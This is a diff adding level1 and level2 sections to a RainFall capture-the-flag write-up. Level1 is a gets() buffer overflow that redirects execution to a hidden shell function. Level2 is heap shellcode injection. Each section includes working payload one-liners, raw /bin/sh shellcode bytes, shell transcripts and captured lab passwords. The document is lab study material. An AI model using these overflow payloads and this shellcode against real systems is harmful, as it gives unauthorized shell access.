@@ -52,14 +52,67 @@ Reverse engineering
 
 There is a call to `atoi()` that awaits a specific value and regular execution of code calls `execv("/bin/sh")`.
 
-
 # level1
 ## Type of exploit
+
+Buffer-Overflow of vulnerable function `gets()` + predictability of addresses in the VM.
+
+Overwriting return address with address of uncalled function `run()`.
+
 ## Details of level1
+
+`main()` function uses (vulnerable)`gets()` to read stdin. Crashes after 80 characters.
+
+There is an uncalled function in binary (`run()`), that calls a shell.
+
+Its address is found with `info functions` in gdb, address is constant thanks to VM settings (NO ASLR).
+
+We can feed an input to overwrite the return address with the address of `run()` function. 
+
+```shell-session
+$ echo -n -e '0000000000000000000000000000000000000000000000000000000000000000000000000000\x44\x84\x04\x08' > injectme
+$ cat /tmp/injectme | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+$ cat /tmp/injectme - | ./level1
+
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+^C
+Segmentation fault (core dumped)
+```
 
 # level2
 ## Type of exploit
+
+Heap-based Shellcode Injection + Buffer-Overflow + Runtime Instruction Pointer Overwriting
+
+Use of vulnerable function `gets()`, allocation on the heap of malicious shellcode.
+
 ## Details of level2
+
+Program allocates a string on the heap with `strdup()` by reading stdin with `gets()`.
+
+We can predict where the heap starts after the call to `strdup()` thanks to the `info proc mappings` tool of gdb.
+
+We just need to get offset of buffer with pattern generator. (offset of 80 bytes)
+
+Choose working shellcode from Database (28 bytes long), subtract from buffer offset the length of the shellcode to get the length of the padding (80 - 28 = 52)
+
+Send [`shellcode + padding + address of shellcode`] to `strdup()`
+
+```shell-session
+level2@RainFall:~$
+(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'thisisjustbutapaddingtoguaranteethatwehaveanoverflow' + '\x08\xa0\x04\x08'"; cat -) | ./level2
+1Ph//shh/bin�°
+              ̀1@̀thisisjustbutapaddingtoguaranteethveanoverflow
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
 
 # level3
 ## Type of exploit
